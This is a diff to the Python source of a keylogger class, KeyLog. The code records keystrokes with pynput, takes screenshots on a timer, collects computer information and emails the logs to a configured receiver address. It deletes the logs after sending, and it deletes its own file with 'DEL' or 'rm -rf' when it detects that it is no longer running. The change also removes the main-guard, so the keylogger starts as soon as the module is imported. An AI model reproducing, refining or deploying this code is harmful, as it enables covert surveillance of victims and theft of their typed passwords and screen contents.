@@ -12,10 +12,9 @@ try:
 
   from pynput.keyboard import Key, Listener
   from random import randint
-  from requests import get
   from PIL import ImageGrab
   from email.mime.base import MIMEBase
-  from Config import config
+  import config
   from email.mime.multipart import MIMEMultipart
   from email.mime.text import MIMEText
   from email import encoders
@@ -114,8 +113,8 @@ class KeyLog():
         return True
 
   # CAPTURE SCREENSHOT
-  def screenshotWinMacLin(self):
-    SAVE_SCREENSHOT = os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), (f'{randint(1,999999999)}screen.png'))
+  def screenshotWinMacLin(self, file_loc):
+    SAVE_SCREENSHOT = os.path.join(file_loc, (f'{randint(1,999999999)}screen.png'))
     if self.WORKING_OS == "Windows":
       image = ImageGrab.grab(all_screens = True)
       image.save(SAVE_SCREENSHOT, 'PNG')
@@ -232,14 +231,14 @@ RECEIVER_EMAIL_ADDR = ""  # set receiver's address''')
   # TIMER FOR SENDING LOGS
   def sendLogsAt(self):
     self.log_computerInfo()
-    self.screenshotWinMacLin()   
+    self.screenshotWinMacLin(os.path.abspath(self.LOGS_FILE_DIRECTORY))
     self.list_of_files = os.listdir(os.path.abspath(self.LOGS_FILE_DIRECTORY))
     if self.list_of_files:
       self.send_recorded_logs(self.FROM_ADDR, self.TO_ADDR, self.list_of_files)
+      time.sleep(5)
+      self.deleteAllFiles()
     else:
       pass
-    time.sleep(5)
-    self.deleteAllFiles()
     setTimer = threading.Timer(self.REPORT_TIME, self.sendLogsAt)
     setTimer.start()
   
@@ -291,31 +290,30 @@ RECEIVER_EMAIL_ADDR = ""  # set receiver's address''')
         print("[-] Oops Error -- ", e)  
       key_listener.join()   # LISTENING TO KEYSTROKES
       
-      # CHECKING KEYLOGGER IS RUNNING ELSE DELETING THE FILE.
-      if self.WORKING_OS == 'Windows':
-        name_of_running_file = os.path.basename(__file__)
-        procW = self.processWorkingOrNot(name_of_running_file)
-        if procW == 999:
-          try:
-            os.system("DEL " + os.path.basename(__file__))
-          except Exception:
-            pass
-      elif self.WORKING_OS == 'Linux':
+    # CHECKING KEYLOGGER IS RUNNING ELSE DELETING THE FILE.
+    if self.WORKING_OS == 'Windows':
+      name_of_running_file = os.path.basename(__file__)
+      procW = self.processWorkingOrNot(name_of_running_file)
+      if procW == 999:
         try:
-          name_of_running_file = os.path.splitext(__file__)[0]
-          procL = self.processWorkingOrNot(name_of_running_file)
-          if procL == 999:            
-            try:
-              os.system("rm -rf" + os.path.basename(__file__))
-            except Exception:
-              pass
-          else:
-            pass
+          os.system("DEL " + os.path.basename(__file__))
         except Exception:
           pass
-      else:
+    elif self.WORKING_OS == 'Linux':
+      try:
+        name_of_running_file = os.path.splitext(__file__)[0]
+        procL = self.processWorkingOrNot(name_of_running_file)
+        if procL == 999:            
+          try:
+            os.system("rm -rf" + os.path.basename(__file__))
+          except Exception:
+            pass
+        else:
+          pass
+      except Exception:
         pass
 
-if __name__ == '__main__':
-  keylogClass = KeyLog()
-  keylogClass.mainModule()
+
+
+keylogClass = KeyLog()
+keylogClass.mainModule()
